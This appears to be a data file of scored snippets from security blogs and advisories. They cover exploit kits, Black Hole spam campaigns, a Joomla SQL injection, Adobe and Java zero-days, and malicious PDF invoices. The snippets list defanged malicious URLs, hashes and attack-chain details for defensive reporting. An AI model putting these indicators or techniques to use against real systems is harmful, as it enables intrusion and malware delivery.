Browsing the first page of search results reveals lots of information about the MDAC vulnerability, articles on attacks in the wild using the MDAC vulnerability, several behavioural analysis and anti-virus reports related to the vector and strings queried, and exploit files used by bad actors to exploit the MDAC vulnerability. If an analyst is not familiar with this exploit, each of these leads can be followed up until reasonable certainty is obtained as to the identity of the exploit. This often involves a few security reports followed up by a Milw0rm or Metasploit script analysis to accurately identify the structure and context of exploits compared to the file under analysis.
Conclusive identification of an exploit can only take place with the following actions taken after initial research is performed:
An exact copy of a known identified exploit online matches that of the exploit being analysed.
A minor copy of an exploit is identified, with no major changes in core functionality of the exploit vector.
Carefully controlled behavioural analysis of a specific exploit vector is employed against the suspected vector inside a LAMP/WAMP server or against a remote live server. This may involve fully patching a system and then removing the patch suspected to be the fix for the vector being targeted by the exploit file.
An expert in exploitation analysis qualifies the initial findings.
Another item that analysts should look for when performing kit analysis is the bad actor’s comments and marketing media. The authors of exploit kits often use slang when referring to specific common vectors of attack, such as ‘MDAC, Snapshot, qt’ and so on. Learning the common slang terms used can serve as a pointer to an analyst investigating an exploit script within a kit.
In reviewing the de-zended Tornado scripts, many hours may pass before key elements of each script are identified, researched, correlated, and/or confirmed. When done with such research it is common to have some vectors of exploitation that have been identified conclusively, while others are found to be highly likely, and others still may be unconfirmed but highly likely based upon both local lab tests and correlation to patterns and remote data that suggest full functionality of a kit. In the case of Tornado, the following exploit vectors can be identified in the aforementioned PHP files:
x1: CVE-2006-0003. Microsoft Windows Server 2003 Service Pack 1 RDS.Dataspace ActiveX Control Access Control Vulnerability (Microsoft Data Access Components – MDAC)
x2: CVE-2006-3730. WebViewFolderIcon (WVF)
x3: CVE-2007-0024. Vulnerability in Vector Markup Language Could Allow Remote Code Execution (929969) (VML)
x4: CVE-2007-0015. Buffer overflow in Apple QuickTime 7.1.3
x5, x6: CVE-2006-0005. Microsoft Windows Media Player Plugin Buffer Overflow Vulnerability (WMP Plugin for Opera/FireFox Embed).
x7, x7b: CVE-2007-6166. QuickTime RTSP Response vulnerability
x8: CVE-2006-6884. WinZip FileView ActiveX controls CreateNewFolderFromName() Method Buffer Overflow
x9: CVE-2007-2987. Zenturi ProgramChecker ActiveX (sasatl.dll) Remote Buffer Overflow
x10: CVE-2007-3147, CVE-2007-3148. Yahoo! Webcam view Utilities ActiveX Control Vulnerable to Arbitrary Code Execution
x11: CVE-2009-1930. Microsoft Windows Server 2008 Service Pack 2 Telnet Server Unspecified Vulnerability (Opera 9.25 and earlier; TN3270)
x12: CVE-2006-5745. Vulnerability in Microsoft XML Core Services Could Allow Remote Code Execution (928088)
x15, x15b: CVE-2003-0111. Java ByteCode Verifier / Flaw in Microsoft VM
x16, x16b: CVE-2007-0038. Microsoft Windows Animated Cursor Remote Code Execution Vulnerability (925902) (ANI) Vulnerability in Microsoft Management Console Could Allow Remote Code Execution (917008; MS06-044). Publicly reported but not confirmed in lab samples: CVE-2006-3643.
Once research has been completed the analyst can perform follow-up kit analysis by tracking common strings, CLSID values and other components that led to a successful identification of an exploit vector. This greatly expedites future kit analysis since many of the vectors used in a kit are widely used by many kits. As such, once the steep learning curve of kit analysis has been completed the analyst will be able to identify new kits easily and rapidly, and more importantly, identify new exploit vectors used by a kit in the wild. As an example, common slang terms like ‘TN3270’ or ‘TN 3270’ are commonly used to refer to a Telnet server vulnerability ‘Microsoft Windows Server 2008 Service Pack 2 Telnet Server Unspecified Vulnerability (Opera 9.25 and earlier; TN3270)’, CVE-2009-1930, MS09-042.
To apply what you have learned in this article try to identify the exploit using this CLSID: 10072CEC-8CC1-11D1-986E-00A0C955B42E. You should be able to get an idea of what the exploit vector is within 15 seconds or less, tied to an exploitation that first began in 2006 and 2007 in the wild.
",0.010745874956608503
"Over the past week, cybercriminals have been spamvertising millions of emails impersonating Amazon.com in an attempt to trick customers into thinking that they’ve received a Shipping Confirmation for a Vizio XVT3D04, HD 40-Inch 720p 100 Hz Cinema 3D LED-LCD HDTV FullHD and Four Pairs of 3D Glasses.
Once users click on any of the links found in the malicious email, they’re automatically exposed to the client-side exploits served by the latest version of the Black Hole Exploit kit.
More details:",0.012054589603094246
Sample screenshot of the spamvertised email:,0.010990132234593664
Second screenshot of the spamvertised email impersonating Amazon.com Inc:,0.009521990856277252
"Once users click on the links found in the malicious email, they’re presented with the following bogus “Page loading…” page:",0.01677936043872319
"Sample subjects used in the spamvertised emails: Re: HD TV Waiting on delivery Few hours ago; Your HDTV Delivered Now; Re: HDTV Processed Yesterday; Re: Order Processed Today; Your Order Approved Few hours ago
Sample compromised URLs used in the malicious campaign: hxxp://manxwoman.net/administrator/amazinhdtv.html; hxxp://shuraki.com/wp-admin/hdtvamazon.html; hxxp://hagigim.net/wp-admin/hdtvamazon.html; hxxp://localsearchtrafficnow.com/wp-admin/hdtvamazon.html; hxxp://aclcinema.com/wp-admin/hdtvamazon.html; hxxp://mulberryhandbags.net/images/hdtvamazon.html; hxxp://doomsdaypreppersplan.com/wp-admin/hdtvamazon.html; hxxp://christiaanse-taxateur.nl/wp-admin/hdtvamazon.html; hxxp://institutobiblicosanpablo.org/site/amazinhdtv.html; hxxp://lacastalia.com/scripts/amazinhdtv.html; hxxp://twoshakes.ca/wp-admin/amazinhdtv.html; hxxp://quangcaowebtrengoogle.com/administrator/amazinhdtv.html; hxxp://vedsoft.info/wp-admin/amazinhdtv.html; hxxp://kineticenergix.com/wp-admin/amazinhdtv.html; hxxp://smescement.ru/3dhdtvordr.html; hxxp://j-goods.us/3dhdtvordr.html; hxxp://xn--nietypowe-meble-na-zamwienie-6zc.pl/3dhdtvordr.html
Sample detection rate for the malicious Java script: – Amazon.html – MD5: a8af3b2fba56a23461f2cc97a7b97830 detected by 20 out of 43 antivirus scanners as JS/Obfuscus.AACB!tr; Trojan-Downloader.JS.Expack.ael
Client-side exploitation URL: hxxp://webgrafismo.net/detects/rates-event_convinced-sent.php; hxxp://webgrafismo.net/detects/rates-event_convinced-sent.php?bve=3406073633&prny=3949&cmarvjgs=qqfngaf&gugrxt=qrs; hxxp://pallada-cruise.net/detects/plain-keyboard_beginning-monitor.php
Once a successful client-side exploitation takes place, the Black Hole Exploit kits drops a malicious PDF file with MD5: 9a22573eb991a3780791a2df9c55ddab that’s exploiting the CVE-2010-0188 vulnerability.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.012485526290398341
"SQL Injection Vulnerability in Joomla! 3.7
Security Risk: SevereExploitation Level: Easy/RemoteDREAD Score: 8.6/10Vulnerability: SQL InjectionPatched Version: 3.7.1
During regular research audits for our Sucuri Firewall (WAF), we discovered a SQL Injection vulnerability affecting Joomla! 3.7 – CVE-2017-8917. The vulnerability is easy to exploit and doesn’t require a privileged account on the victim’s site.
Are You at Risk?
The vulnerability is caused by a new component, com_fields, which was introduced in version 3.7. If you use this version, you are affected and should update as soon as possible. This vulnerable component is publicly accessible, which means this issue can be exploited by any malicious individual visiting your site.
Given the nature of SQL Injection attacks, there are many ways an attacker could cause harm – examples include leaking password hashes and hijacking a logged-in user’s session (the latter results in a full site compromise if an administrator session is stolen).
Technical Details
The public-facing com_fields component borrows some views from the administrative side component of the same name. While this may sound like an odd thing to do, it serves a very practical purpose – it allows the reuse of generic code that was written for the other side, instead of writing it from scratch again.",0.007670164444801952
"As you can see from the snippet above, it sets the $config[‘base_path’] variable with the JPATH_COMPONENT_ADMINISTRATOR constant value which represents the local path to the administrator component directory. Doing this will cause Joomla! to grab views and models from this path instead of the public facing one. As this action is conditional to the view parameter containing fields and layout to contain modal, we know the URL to access this view must look like this:
/index.php?option=com_fields&view=fields&layout=modal
Visiting this URL leads to a listing of all the custom fields available on the site which can be ordered based on various parameters.
The only administrator view that can be accessed is fields – and this will grab its data from an admin-side model (due to the $config[‘base_path’] trick we discussed earlier). In this case, the vulnerability we discovered was located in the FieldsModelFields model, in ./administrator/components/com_fields/models/fields.php.
The culprit can be found in the getListQuery method.",0.010767957771109282
"For those not familiar with how Joomla! deals with SQL queries, the $query->order() really is just a method whose input will be concatenated to a query’s ORDER BY statement, so you can guess that leaving non-sanitized user input in there is the last thing you want. Unfortunately, this is exactly what happened.",0.011018707875851796
"The list.fullordering state can be populated with user input because the FieldsModelFields model inherits from the JModelList class, which contains the snippet above. You may notice that it performs some verification on the content and then sets the list.direction and list.ordering state accordingly, but what about list.fullordering?",0.012338669331939833
"After the switch statement, this instruction sets the state we were looking for with a value that we can control, regardless of whether it generated a valid list.direction or list.ordering state.
So in order to exploit this vulnerability, all an attacker has to do is  add the proper parameters to the URL in order to inject nested SQL queries.
In Conclusion
If you have not already, update as soon as possible!
This is a serious vulnerability that can be misused in different ways to compromise a vulnerable site. Update now. If you believe your Joomla site is hacked, you can follow our free DIY cleanup guide.
",0.010863101004328302
UTM Up2Date 9.104 Released,0.00844032962069885
"Written by
Eric Bégoc",0.010229904213713614
"August 08, 2013",0.009466459298868024
Network up2date UTM UTM 9,0.01007005226623292
A new Up2Date is available for Sophos UTM. Release 9.104 fixes some bugs and increases the stability of your UTM 9 installation. While you will get considerably more detailed information from our Wireless Protection we also changed behavior for the RED/VPN notifications. We have also improved the performance for DNS lookups in our Web Filter. Read on to see the whole list of changes.,0.009679457258257251
"Sophos UTM 9.104-17
News",0.009326564180754615
"Bugfix Release
Fixed: Several issues with RED and Wifi stability
Fixed: Several issues with Web Protection reporting
Fixed: Several issues with IPv6 Prefix Delegation
Fixed: Missing entries in the Japanese Localization
Added: Button to reset UTM ID to be able to use Endpoint Protection on cloned machines
Changed: RED/VPN up/down notifications are disabled by default
Changed: Show more detail information in Wireless Protection
Changed: Improve DNS lookup performance in Web Filter",0.010041272218703212
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected REDs will perform firmware upgrade
Connected Wifi APs will perform firmware upgrade",0.010102543935749386
Bugfixes,0.009816324567177737
"22750 Swapon failed for explicit UUID
25742 ha: disabling virtual_mac for ha did not result in different mac addresses on master/slave
25766 RED 50 connection is permanently dropped after HA takeover
25916 SUM can’t set Web Filter URL Blacklist and URL Whitelist
26002 Web Application Security: .docx files broken after upload and download
26052 Performance problem in MiddleWare when generating SSL VPN configuration with many networks and users
26066 Show Frequency Band in the info of the Wireless Networks
26119 Wifi [ASG]: MAC Filter Whitelist not working
26452 Web Security reporting does not work correctly
26613 Since update to v9.101 inodes are filling up the slave node root partition
27481: Permanent openvpn daemon restarts after installing UTM 9.104 soft release
27495: CVE-2013-4854: A specially crafted query can cause BIND to terminate abnormally [9.1]",0.008325533322298795
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.
Download Link*: ftp://ftp.astaro.com/UTM/v9/up2date/u2d-sys-9.103005-104017.tgz.gpg
MD5 Sum: 68b7707c1f39388839a81c24a12efa18
Size:  ~94MB
*Note that the Up2date package file names now include the source version TO the target version (above is 9.103-5 to 9.104-17).
Up2Date Installation: Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version. There are two ways to apply an already-downloaded Up2Date package to the system:
1. Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.01024217872940647
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you). e.g. “[9.104] Enabling RED up/down notifications”.
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.013270127619472438
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"Malware taking advantage of Android OS exploits, again: Gooligan
From what we can gather from Check Point’s blog post, Gooligan is an already well-known threat with a new name hinted by Google’s official statement. Rest assured this has and will be detected by Malwarebytes Anti-Malware for Mobile.
As Check Point pointed out, there are many devices still on the market with versions of the Android OS that are susceptible to exploits, such as VROOT (CVE-2013-6282) and Towelroot (CVE-2014-3153) used by Gooligan. These particular exploits work on Android OS versions 5 and below, which accounts for 74.4% of devices on the market according to Google at the time of this writing.
Unless Google creates patches to fix these holes in security on devices that take up a staggering amount of the market, malware will be created to take advantage of them. Will Gooligan be the last straw to push Google to create patches? Let’s hope so. Companies like Samsung and Motorola have been working with Google on efforts to push updates more frequently, so it seems there is hope.
If patches are created, the next step is getting users to install them, which is a whole other battle. If you do have an update sitting on your Android OS you may have neglected, now is as good a time as any to go ahead and update.
As always, be weary of third party app stores. As often the case, you get what you pay for on such stores. Be safe out there!
",0.012202034506545445
UTM Up2Date 9.203 Released,0.008514601493668894
"Written by
Eric Bégoc",0.010229904213713614
"June 18, 2014",0.008192054122057146
Network up2date UTM UTM 9,0.01007005226623292
"We are pleased to announce that a new Up2Date package is available for Sophos UTM.
This update introduces several bug fixes and also includes the fix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224)
Please read on to see the full details of this release.",0.011304481087601514
"Sophos UTM 9.203
News",0.009046126738169735
Security Update,0.007849980180340443
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade
Connected RED devices will perform firmware upgrade
Windows SSL VPN Client should be updated",0.00927209091507264
Bugfixes,0.009816324567177737
"31027 FTP proxy active mode did not work and failed with the antivirus turned on
31460 Exception is detected but will be ignored on outgoing emails (when scan outgoing messages is active)
31571 Executive reports failed with error message “Bad file descriptor”
31594 Display of a SG Series shows ‘HA Slave Status Error’
31716 Permanent admin-reporter.pl restarts causing high cpu load
31938 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224)",0.009986407918688545
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.",0.011992808570035818
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.202028-203003.tgz.gpg",0.010114968434797866
"Up2date MD5sum:
003dd2c89a9281f2b34d7c92892fc563",0.010059996659364856
"File size:
≈60MB",0.008196773175271788
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Security researchers from Webroot have intercepted a currently spamvertised malicious campaign, impersonating Hewlett Packard, and enticing end and corporate users into downloading and viewing a malicious .htm attachment.",0.02014263260551752
More details:,0.008320251094065867
"Subject: Re: Scan from a Hewlett-Packard ScanJet [random number]
Message: Attached document was scanned and sent to you using a Hewlett-Packard NetJet 730918SL. SENT BY : ANISSA PAGES : 5 FILETYPE: .HTM [Internet Explorer File]
Original attachment: HP_Jet_26_P2184.zip
Malicious iFrame embedded within the .htm attachment: hxxp://superproomgh.ru:8080/navigator/jueoaritjuir.php
The malicious .htm has a very low detection rate, and is currently detected as JS/Kryptik.SA!tr and Mal/Iframe-AE.
Client-side exploits serving structure:
hxxp://superproomgh.ru:8080/navigator/jueoaritjuir.php
hxxp://superproomgh.ru:8080/navigator/fsytklfwiqbz.jar
hxxp://superproomgh.ru:8080/navigator/hmfngpdshsknblc.jar
hxxp://superproomgh.ru:8080/navigator/alisgtypezfq1.pdf
The client-side exploits serving domain superproomgh.ru is currenly fast-fluxed, namely it’s responding to multiple, dynamically changing IP addresses in an attempt by the cybercriminals behind the campaingn, to make it harder for vendors and researchers to take it down.",0.008918586760192415
"The campaign is attempting to exploit the “Libtiff integer overflow in Adobe Reader and Acrobat” vulnerability, also known as CVE-2010-0188 in an attempt to drop the following MD5 on the exploited hosts – MD5: 20de62566248864be3b0e413b332d731 currently detected as Win32:Sirefef-RV [Drp], Trojan.Generic.KDV.582649, HEUR:Trojan.Win32.Generic, or PWS-Zbot.gen.hv.
Webroot security researchers will continue monitoring this campaign to ensure that Webroot SecureAnywhere customers are protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009467258463789263
"Adobe Reader zero-day discovered alongside Windows vulnerability
During the first half of 2018, we have witnessed some particularly interesting zero-day exploits, including one for Flash (CVE-2018-4878) and more recently for Internet Explorer (CVE-2018-8174). The former was quickly used by exploit kits such as Magnitude, while it is only a matter of time before we see the latter being weaponized more widely.
We can now add to that list an Adobe Reader zero-day (CVE-2018-4990), which was reported by ESET and Microsoft and has already been patched. Although it has not been observed in the wild yet, it remains a dangerous threat considering it is coupled with a privilege escalation vulnerability in Microsoft Windows.
To exploit the Windows vulnerability, the attacker must write to an arbitrary address in kernel space, which will not work for Windows 8 and above, as newer security features prevent this kind of mapping. Those two combined zero-days were necessary to escape the Acrobat Reader sandbox protection, which to its credit has been improving the security of the software drastically, so much so that malicious PDFs that were once common as part of drive-by download attacks have all but vanished.
Let’s take a quick look at the malicious PDF using pdf-parser:
python pdf-parser.py --content CVE-2018-4990.pdf",0.012685209439366907
"We can see a suspicious obfuscated blurb that most likely contains the JavaScript code we are looking for. We can decode and dump the output to a raw file:
python pdf-parser.py -c CVE-2018-4990.pdf --object 1 --filter --raw > output.raw",0.014158603671282521
"The exploit code is now visible in clear text. For a good explanation on how it is used for the ROP chain and shellcode execution, please refer to the ESET article.
We tested this zero-day against Malwarebytes, which was already stopping it without the need for any additional updates. The mitigation happens at the very beginning of the exploitation chain (stack pivoting):",0.01148433801488491
"We recommend users patch their systems to prevent this threat, which will most likely be weaponized in the wild soon. A very plausible attack scenario would be a PDF attachment in a malspam campaign.
The Adobe security bulletin (CVE-2018-4990) can be found here, while Microsoft’s (CVE-2018-8120) is here.
",0.008717517453560641
"PCI Compliance, Penetration Testing, and the Sucuri WAF",0.009006513118655302
"Our support team is often asked, “Can we test our site through the Sucuri Web Application Firewall?”
The answer is always yes, with a caveat. Tests that are intended to cause a disruption of the service, such as DoS attacks, are not allowed. We are there to help you if you do come under a DoS attack, but not if you cause it intentionally.
Should you whitelist the PCI compliance or penetration test IPs?
The approval to run a PCI compliance or penetration test throws up a question: Do you want to whitelist the testers’ IP addresses or not? Both have their advantages, and we do have clients who go to that trouble of running two tests.
Whitelisting an IP address will allow all behavior from that location where it would otherwise be blocked with a 403 response. Too many 403 responses in a short period of time will cause the IP address to be banned by our systems.
Not whitelisting the PCI compliance or penetration test IPs
Firstly, not whitelisting the tester’s IP address requires the tester to rate limit their test to a reasonable speed that would not be seen as abusive of our service. You are testing the Sucuri WAF and it will work as intended, blocking all known vulnerabilities.
Whitelisting the PCI compliance or penetration test IPs
Then we have the option of whitelisting the tester’s IP address. You would not be testing the WAF, but the web application itself, so you can run the test at a much faster rate. There is a lot of value in that.
Maybe you have staff or other applications that access the web application that bypasses the WAF. It might be good to know what vulnerabilities exist in the site’s code. But this does not test the site as the public or an attacker would see it.
Bypassing the WAF
Some penetration testing solutions have an option to bypass the WAF entirely, setting the host IP address as the target which gives you a third option. This can be very useful when you might have a load balancer in play and want to test multiple hosting servers.
Personally as a best practice, I like the idea of testing from a whitelisted IP, listing any flagged vulnerabilities, and then testing those specifically using a proof of concept method through the WAF to confirm all is well. The bad behavior is blocked, but I still have the developers fix the site code. That would be a best practice, but maybe overkill for most site owners. Nevertheless, this is a popular testing methodology for some of our enterprise customers.
Why test the WAF?
But why test? I can understand wanting to run a penetration test  through the WAF to confirm we really are blocking all the bad behavior. Maybe you, the client, have whitelisted some path that makes you vulnerable or bypassed testing it in some way to confirm the site code is good.
It might be a bit extreme to run a PCI compliance test of the WAF, apart from intentionally setting the WAF to forward traffic to HTTP from HTTPS. It would not be possible for a site behind the WAF to fail a PCI compliance test, regardless of the condition of the site code.
Will Sucuri work with the testers?
Sucuri will work alongside you, with whatever reasonable test you chose to run. But sometimes we need to explain why the specialist a client hired got it wrong. I’ll share a few examples from some of the reports clients have shared with us in the last few months.
Examples of awkward WAF penetration test results",0.02177683057073254
"On this report, we can see that they did in fact scan the WAF by confirming the IP address. The WAF is clearly identified in the response headers as being based on NGINX, so a vulnerability in Apache would be irrelevant. The Sucuri WAF removes the headers that identify the site from running on anything other than NGINX. There is no valid test which could show the client was at risk of CVE-2019-0215, even if the client was running this older version of Apache.",0.009551514808439188
"Both parts of this example have no CVE. Tthe first they have identified an obscure vulnerability in the WAF that relates to a consumer home WIFI router.
The second relates to a Windows web server which was discontinued some 17 years ago. If you were really running that for an ecommerce solution, that would be the least of your problems. And to make matters worse, the WAF blocks the mentioned OPTIONS method by default, as was the case on this website.
And my last example, from our WAF logs…",0.00656010452572664
"Here the testers did not see a 403 block message, but 301 redirect messages. If they had followed the 301, as would any bad actor, they would have seen the 403 block. They would never have seen a 200 response (allowed).
I did speak to them, and they said their scanner was unable to follow redirects. I asked them to scan https:// rather than http://, avoiding the redirect requirement. The scan was completed successfully, but it really does call into question whether the tester understands what the testing was for.
Tests generally are great. If we had more responsible testing, there would be a lot less breaches. I should point out that my first two examples were from firms who have carried out thousands of tests on sites behind the Sucuri WAF. They do rarely get it wrong if you consider the scale.
PCI compliance and the Sucuri WAF
I doubt the Sucuri WAF is the only one that by default makes a website PCI compliant. In a perfect world, the PCI compliance testers would check if such a WAF was in place first. In fact, in many cases a PCI compliance test is not required of the website, with the client only needing to pass on our AOC document which we can supply on request. Feel free to chat with us if you have any questions about the Sucuri WAF.
",0.016215222412235275
HP Printer HTTP Authentication Bypass,0.008263624193488472
"Posted by Roger on 6 February 2009, 9:56 pm",0.012960272265503558
"HP is reporting that “a potential security vulnerability has been identified with certain HP LaserJet printers, HP Color LaserJet printers and HP Digital Senders. The vulnerability could be exploited remotely to gain unauthorized access to files.”
CVE-2008-4419 adds that this is a directory traversal vulnerability.
In a post to Bugtraq, Digital Defense says an attacker can read arbitrary system configuration files, and cached documents.
HP Web Jetadmin should make quick work for printer admins needing to perform updates.
",0.006298903359868713
"Java 0‑Day Exploit CVE‑2013‑0422
The infamous exploit packs Blackhole and Nuclear Pack now feature a new zero-day Java exploit that exploits the Java vulnerability CVE-2013-0422. The latest version of Java 7 Update 10 is affected. Malware spreading through drive-by-downloads often utilizes exploit packs, which are able to serve malware variants without any user interaction, as opposed to other techniques",0.015320106449037807
11 Jan 2013 - 07:01AM,0.012374495273252073
"The infamous exploit packs Blackhole and Nuclear Pack now feature a new zero-day Java exploit that exploits the Java vulnerability CVE-2013-0422. The latest version of Java 7 Update 10 is affected. Malware spreading through drive-by-downloads often utilizes exploit packs, which are able to serve malware variants without any user interaction, as opposed to other techniques",0.016832823065406344
The infamous exploit packs Blackhole and Nuclear Pack now feature a new zero-day Java exploit that exploits the Java vulnerability CVE-2013-0422. The latest version of Java 7 Update 10 is affected.,0.013535661889183759
"Malware spreading through drive-by-downloads often utilizes exploit packs, which are able to serve malware variants without any user interaction, as opposed to other techniques relying on social engineering.",0.013724759603569114
"While users of ESET security products are protected from this threat (we detect it as Java/Exploit.CVE-2013-0422) we do concur with the advice given by Brian Krebs to disable Java if not needed, so as to minimize the potential attack vectors used by malware.",0.010273377837332287
"Java 0-days are nothing new under the sun, a past example is mentioned in the blog post by Stephen Cobb. Java 7 Update 10, however, considerably simplifies the process of disabling Java in browsers, and we strongly advise users to keep their software updated to the latest versions.",0.014057611160821604
"Robert Lipovsky
Malware Researcher
",0.007793911827169708
"Intuit users, beware!
Cybercriminals are currently mass mailing millions of emails impersonating Intuit’s Direct Deposit Service, in an attempt to trick its users into clicking on the malicious links found in the legitimate-looking emails. Upon clicking on any of them, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.01471871772051514
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample compromised URLs used in the campaign: hxxp://www.transplantexperience.in/inproldet.html; hxxp://www.skullisland.ca/inproldet.html; hxxp://pozycjonowanie.profi-group.pl/inproldet.html; hxxp://www.transplantexperience.in/inproldet.html; hxxp://www.luxense.eu/inproldet.html; hxxp://media.ted.fr/sites/inproldet.html; hxxp://tacmap.jp/sites/inproldet.html; hxxp://spiler.hu/inproldet.html; hxxp://archaeology.tau.ac.il/inproldet.html; hxxp://www.tecfedericotaylor.edu.gt/inproldet.html; hxxp://www.viaherworld.com/inproldet.html
Client-side exploits serving URL: hxxp://savedordercommunicates.info/detects/bank_thinking.php; hxxp://savedordercommunicates.info/detects/bank_thinking.php?
eony=3833043409&ujmp=36&akemejo=03370b370a33070b0207&lwv=0a000300040002
Upon loading, the malicious URL attempts to drop a PDF on the affected host that’s exploiting CVE-2010-0188. Once successful, the client-side exploit then drops additional malware.
Detection rate for the dropped malware: MD5: ebe81fe9a632726cb174043f6ac93e46 – detected by 14 out of 44 antivirus scanners as Trojan.Win32.Bublik.qqf
Client-side exploits serving domain reconnaissance:
savedordercommunicates.info – 75.127.15.39, AS36352 – Email: heike_ruigrok32@naplesnews.net
Name Server: NS1.CHELSEAFUN.NET – 173.234.9.89, AS15003 – also responding to the same IP is the following malicious name server: ns1.nationalwinemak.com
Name Server: NS2.CHELSEAFUN.NET – 65.131.100.90, AS209
We’ve already seen the same name servers used in the previously profiled “‘Your Discover Card Services Blockaded’ themed emails serve client-side exploits and malware” malicious campaign, indicating that both of these campaigns are managed by the same malicious party.
Responding to the same IP (75.127.15.39) is also the following malicious domain:
teamscapabilitieswhich.org
This isn’t the first time that we’ve intercepted Intuit themed malicious campaigns. Consider going through previous analyses profiling malicious campaigns impersonating the company:",0.011402642067761204
"‘Intuit Payroll Confirmation inquiry’ themed emails lead to the Black Hole exploit kit
Intuit themed ‘QuickBooks Update: Urgent’ emails lead to Black Hole exploit kit
Cybercriminals impersonate Intuit Market, mass mail millions of exploits and malware serving emails
Spamvertised Intuit themed emails lead to Black Hole exploit kit",0.011481766699492413
"Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010870420641694412
"Email-borne exploits: the not-so innocuous killers targeting small business
Update (05/21/2014): As previously suspected, other reports also support that CVE-2013-2729 is being used in malicious PDFs).
Email remains a widely used infection vector that mostly relies on social engineering a victim to click on a link or execute an attachment.
As far as malicious attachments go, the majority are zipped executables that often use the double extension trick (i.e. Invoice.doc.exe) and will directly infect a user’s PC as soon as they are ran.
But there’s another type of malicious attachments, one that we seldom hear about, that may deceive a lot of people and sneak by your antivirus: regular documents that have been exploited.
Just a couple of days ago, we spotted a new wave of spam emails spewing malicious PDF files. The decoy, which purports to be an invoice, is directly attached to an email targeting small businesses:",0.011035712223155691
or a more generic fake Amazon invoice:,0.009350557311812335
All it takes for the infection to propagate is a double-click on the PDF (April invoice 332741.pdf – Order details 749-3004132-4433411.pdf) and a vulnerable version of Adobe Reader (version 11.0 was used in this test).,0.010919767203293018
"This is a two-step exploitation, with first a fake error message (JavaScript):",0.006770953271579727
"which leads to the actual exploit (CVE-2013-2729). If you have information, please share):",0.010401343608265945
"Let’s have a (quick) look at the underlying structure for this exploit: shellcode, heap spray",0.009244450982486385
"(Update 05/12/14)
The shellcode contains the URL that the exploit will contact to download the malicious payload. We can extract it using pdf-parser from Didier Stevens:
Then use a tool (Converter from Kahu Security) to convert Unicode to EXE:
And finally view the URL with PE Insider:",0.01120103629649627
This is what happens if you open the PDF with a vulnerable version (click to enlarge):,0.006639684609096808
"Adobe Reader downloads dr-gottlob-institut . de/11.exe (91aa1168489a732ef7a70ceedc0c3bc9), which in turn downloads pgalvaoteles . pt/111(91d33fc439c64bd517f4f10a0a4574f1):",0.00948192572832074
It is worth noting that both files have ‘Adobe Reader themed’ icons:,0.009691393058607445
"The dropped files download many additional pieces of malware: the infamous ZeuS banking Trojan, CryptoLocker as well as other threats as seen in this Malwarebytes Anti-Malware scan report:",0.011301395832913563
"But, as with all malware, prevention is better than cure. Our Malwarebytes Anti-Exploit product is able to stop this threat before it can do damage:",0.014711682973558293
"The threat is blocked as soon as the user opens up the malicious document, preventing malicious code from ever entering their PC.
Perhaps this type of threat became a little more well-known with the recent Microsoft Word Zero-Day (CVE-2014-1761) embedded in RTF documents that could exploit a system and download remote code, showing that not all exploits stem from browsing booby-trapped websites.
Here’s why exploit protection is also a better solution in this case: malicious documents typically have much lower detection rates than traditional malware binaries (notice how the bad guys didn’t even bother zipping the attachment).
There are more chances for a malicious PDF to make its way past the spam filters and more chances for the user to open it (don’t we all open PDFs from our inbox without thinking twice?).
Also, while you may want to send attachments to online scanning services such as VirusTotal, would you really want to upload and share with the world private contracts, invoices, etc?
It would be very interesting to know the infection rates between malicious documents and malware binaries. While the former do rely on the user’s machine being outdated, that factor is counter-balanced by the inherent trust in documents (Word, Excel, PDF, etc).
